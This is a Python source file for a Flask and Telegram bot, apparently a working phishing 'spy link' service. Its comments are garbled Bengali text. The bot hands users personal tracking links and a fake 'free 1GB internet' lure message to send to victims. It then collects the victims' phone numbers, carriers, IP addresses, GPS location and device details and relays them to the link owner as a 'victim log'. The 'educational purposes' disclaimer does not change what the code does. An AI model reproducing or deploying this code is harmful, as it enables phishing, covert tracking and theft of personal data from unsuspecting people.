import logging
import asyncio
import os
import re
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler, ExtBot
import aiohttp

# --- ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶® ---
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
PHISHING_SITE_URL = os.environ.get("PHISHING_SITE_URL")
RENDER_APP_URL = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}"

CHANNEL_LINK = "https://t.me/+rj4147h5OD8yMzQ9"
OWNER_USERNAME = "https://t.me/TheSagorOfficial"

# ‡¶≤‡¶ó‡¶ø‡¶Ç ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶è‡¶¨‡¶Ç ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßç‡¶≤‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™ ---
# Bot ‡¶è‡¶¨‡¶Ç Application ‡¶Ö‡¶¨‡¶ú‡ßá‡¶ï‡ßç‡¶ü ‡¶¨‡¶ø‡¶∂‡ßç‡¶¨‡¶¨‡ßç‡¶Ø‡¶æ‡¶™‡ßÄ ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá
bot = Bot(token=TOKEN)
application = Application.builder().bot(bot).build()

# Flask ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶á‡¶®‡¶ø‡¶∂‡¶ø‡¶Ø‡¶º‡¶æ‡¶≤‡¶æ‡¶á‡¶ú‡ßá‡¶∂‡¶®
app = Flask(__name__)

# --- ‡¶∂‡¶ø‡¶ï‡¶æ‡¶∞‡ßá‡¶∞ ‡¶°‡ßá‡¶ü‡¶æ ‡¶ó‡ßç‡¶∞‡¶π‡¶£ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ì‡¶Ø‡¶º‡ßá‡¶¨ ‡¶∞‡ßÅ‡¶ü ---
@app.route('/data', methods=['POST'])
async def handle_data():
    try:
        data = await request.get_json()
        logger.info(f"Received data packet: {data}")
        
        if request.headers.getlist("X-Forwarded-For"):
            victim_ip = request.headers.getlist("X-Forwarded-For")[0]
        else:
            victim_ip = request.remote_addr
        
        logger.info(f"Victim IP identified as: {victim_ip}")

        asyncio.create_task(process_victim_data(data, victim_ip))
        
        return jsonify({"status": "success", "message": "Data received"}), 200
    except Exception as e:
        logger.error(f"Error in handle_data: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

# --- ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø Webhook ‡¶∞‡ßÅ‡¶ü ---
@app.route('/telegram', methods=['POST'])
async def telegram_webhook():
    try:
        update_data = await request.get_json()
        update = Update.de_json(update_data, bot)
        await application.process_update(update)
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error(f"Error in telegram_webhook: {e}")
        return jsonify({"status": "error"}), 500

# --- Webhook ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∞‡ßÅ‡¶ü (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï ‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ ‡¶∏‡ßÅ‡¶¨‡¶ø‡¶ß‡¶æ‡¶ú‡¶®‡¶ï) ---
@app.route('/set_webhook', methods=['GET'])
async def set_webhook():
    webhook_url = f"{RENDER_APP_URL}/telegram"
    try:
        await bot.set_webhook(url=webhook_url)
        message = f"Webhook successfully set to: {webhook_url}"
        logger.info(message)
        return jsonify({"status": "success", "message": message}), 200
    except Exception as e:
        error_message = f"Failed to set webhook: {e}"
        logger.error(error_message)
        return jsonify({"status": "error", "message": error_message}), 500

# --- IP ‡¶¨‡¶ø‡¶¨‡¶∞‡¶£ ‡¶™‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ---
async def get_ip_details(ip):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'http://ip-api.com/json/{ip}') as response:
                if response.status == 200:
                    return await response.json()
    except Exception as e:
        logger.error(f"Failed to get IP details for {ip}: {e}")
    return {}

# --- ‡¶∂‡¶ø‡¶ï‡¶æ‡¶∞‡ßá‡¶∞ ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡ßç‡¶∞‡¶∏‡ßá‡¶∏ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ---
async def process_victim_data(data, victim_ip):
    student_id = data.get('student_id', 'unknown')
    form_data = data.get('form_data', {})
    device_info = data.get('device_info', {})
    location_info = data.get('location_info', {})

    ip_details = await get_ip_details(victim_ip)

    location_link = "Not Available"
    if 'lat' in location_info and 'lon' in location_info:
        location_link = f"https://www.google.com/maps?q={location_info['lat']},{location_info['lon']}"

    admin_message = f"""
[student_id={student_id}]
üíÄ ***====[ VICTIM LOG | @TheSagorOfficial ]====*** üíÄ

--- ***FORM DATA*** ---
üìû ***Number:*** `{form_data.get('country')} {form_data.get('mobileNumber')}`
üì° ***Operator:*** `{form_data.get('operator')}`

--- ***IP & LOCATION*** ---
üåê ***IP Address:*** `{victim_ip}`
üè¢ ***ISP:*** `{ip_details.get('isp', 'N/A')}`
üîç ***ASN:*** `{ip_details.get('as', 'N/A')}`
üåç ***Country:*** `{ip_details.get('country', 'N/A')}`
üèôÔ∏è ***City:*** `{ip_details.get('city', 'N/A')}`
üìç ***Google Maps:*** [View on Map]({location_link})

--- ***DEVICE INFO*** ---
üì± ***Device Type:*** `{device_info.get('deviceType', 'N/A')}`
üîã ***Battery:*** `{device_info.get('battery', {}).get('level', 'N/A')}`
üîå ***Charging:*** `{device_info.get('battery', {}).get('charging', 'N/A')}`
üì∂ ***Network:*** `{device_info.get('network', 'N/A')}`
üñ•Ô∏è ***Screen:*** `{device_info.get('screen', 'N/A')}`
‚è∞ ***TimeZone:*** `{device_info.get('timeZone', 'N/A')}`
üÜî ***Platform:*** `{device_info.get('platform', 'N/A')}`
üïµÔ∏è ***User Agent:*** `{device_info.get('userAgent', 'N/A')}`

--- ***STATUS*** ---
üéØ ***Location Status:*** `{location_info.get('error') or f"Success ({location_info.get('accuracy', 'N/A')}m accuracy)"}`
"""
    try:
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message, parse_mode='Markdown')
        logger.info(f"Admin log sent for student {student_id}")
    except Exception as e:
        logger.error(f"Failed to send log to admin: {e}")

# --- ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ ---
async def start_command(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    welcome_message = (
        f"Welcome, {user.first_name}!\n\n"
        "You can use this bot to generate a spy link! üéâ\n\n"
        "ùó¨ùóºùòÇ ùó∞ùóÆùóª ùóõùóÆùó∞ùó∏ :\n"
        "üîπ Front Camera\nüîπ Back Camera\nüîπ Location with map\nüîπ Phone number\nüîπ Sim Type\nüîπ IP, Battery, and many more\nüîπ Device type\n\n"
        "ùó°ùóºùòÅùó≤: ùóúùòÅ ùó∂ùòÄ ùóºùóªùóπùòÜ ùó≥ùóºùóø ùó≥ùòÇùóª ùóÆùóªùó± ùó≤ùó±ùòÇùó∞ùóÆùòÅùó∂ùóºùóªùóÆùóπ ùóΩùòÇùóøùóΩùóºùòÄùó≤ùòÄ üí°\n\n"
        "Now press create button to generate your link. üòä"
    )
    keyboard = [[InlineKeyboardButton("Create", callback_data='create_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def create_link_handler(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    if query:
        await query.answer() # Callback query-‡¶∞ ‡¶â‡¶§‡ßç‡¶§‡¶∞ ‡¶¶‡ßá‡¶ì‡ßü‡¶æ ‡¶ú‡¶∞‡ßÅ‡¶∞‡¶ø
        user_id = query.from_user.id
    else:
        user_id = update.message.from_user.id

    personal_link = f"{PHISHING_SITE_URL}?id={user_id}"
    message_text = (
        "üéâ ùó¨ùóºùòÇùóø ùó®ùóªùó∂ùóæùòÇùó≤ ùóßùóøùóÆùó∞ùó∏ùó∂ùóªùó¥ ùóüùó∂ùóªùó∏ ùó∂ùòÄ ùó•ùó≤ùóÆùó±ùòÜ! üéâ\n\n"
        f"üîó ùó¨ùóºùòÇùóø ùóüùó∂ùóªùó∏: `{personal_link}`\n\n"
        "üìùùó°ùóºùòÅùó≤‚ö†\n\n->This bot ùó®ùó•ùóü not work complete on telegram web\n\n->So Use this ùó®ùó•ùóü on chrome or others browsers.‚úÖ\n\n"
        "Feel The power üí™‚ö° of sagor Sheikh üòé"
    )
    share_text = (
        "üåüùóòùòÖùó∞ùóπùòÇùòÄùó∂ùòÉùó≤ ùó¢ùó≥ùó≥ùó≤ùóø: ùóñùóπùóÆùó∂ùó∫ ùó¨ùóºùòÇùóø ùóôùóøùó≤ùó≤ ùü≠ùóöùóï ùóóùóÆùòÅùóÆ!üåü\n\n"
        "Looking for a quick internet boost? üéÅ\nEnjoy 1GB of free internet üåç‚ú®!\n\n"
        "‚ú® ùóñùóπùóÆùó∂ùó∫ ùòÜùóºùòÇùóø ùóôùó•ùóòùóò ùü≠ùóöùóï ùóªùóºùòÑ! üöÄ\n\n"
        f"üëâùóöùó≤ùòÅ Your ùóôùóøùó≤ùó≤ ùü≠ùóöùóï\nüëâ{personal_link}\n\n"
        "Don't wait, ùóπùó∂ùó∫ùó∂ùòÅùó≤ùó± ùòÅùó∂ùó∫ùó≤ ùóºùó≥ùó≥ùó≤ùóø!"
    )
    telegram_share_url = f"https://t.me/share/url?url={personal_link}&text={share_text.replace(' ', '%20').replace(' ', '%0A')}"
    keyboard = [
        [InlineKeyboardButton("Share this with friends", url=telegram_share_url)],
        [InlineKeyboardButton("My another Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("Contact owner if any issue", url=OWNER_USERNAME)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if query:
        await query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')

async def message_filter(update: Update, context: CallbackContext) -> None:
    if str(update.message.chat_id) != str(ADMIN_CHAT_ID): return
    text = update.message.text or update.message.caption
    if not text: return
    match = re.search(r'\[student_id=(\d+)\]', text)
    if not match: return
    student_id = match.group(1)
    clean_message = re.sub(r'\[student_id=\d+\]\s*', '', text).strip()
    try:
        if update.message.photo:
            await context.bot.send_photo(chat_id=student_id, photo=update.message.photo[-1].file_id, caption=clean_message, parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=student_id, text=clean_message, parse_mode='Markdown')
        logger.info(f"Log successfully forwarded to student {student_id}")
    except Exception as e:
        logger.error(f"Failed to forward log to student {student_id}: {e}")
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"‚ö†Ô∏è **Failed to deliver log to student `{student_id}`.** They might have blocked the bot.", parse_mode='Markdown')

# --- ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞‡¶ó‡ßÅ‡¶≤‡ßã application-‡¶è ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ---
application.add_handler(CommandHandler("start", start_command))
application.add_handler(CommandHandler("create", create_link_handler))
application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, message_filter))

# --- Gunicorn ‡¶è‡¶á ‡¶´‡¶æ‡¶á‡¶≤‡¶ü‡¶ø ‡¶ö‡¶æ‡¶≤‡¶æ‡¶≤‡ßá __name__ ‡¶π‡¶¨‡ßá 'freemb_controller_bot' ‡¶¨‡¶æ ‡¶Ö‡¶®‡ßÅ‡¶∞‡ßÇ‡¶™ ---
# __name__ == '__main__' ‡¶¨‡ßç‡¶≤‡¶ï‡¶ü‡¶ø ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶Ü‡¶∞ ‡¶™‡ßç‡¶∞‡¶Ø‡¶º‡ßã‡¶ú‡¶® ‡¶®‡ßá‡¶á ‡¶ï‡¶æ‡¶∞‡¶£ Gunicorn ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø 'app' ‡¶Ö‡¶¨‡¶ú‡ßá‡¶ï‡ßç‡¶ü‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá‡•§
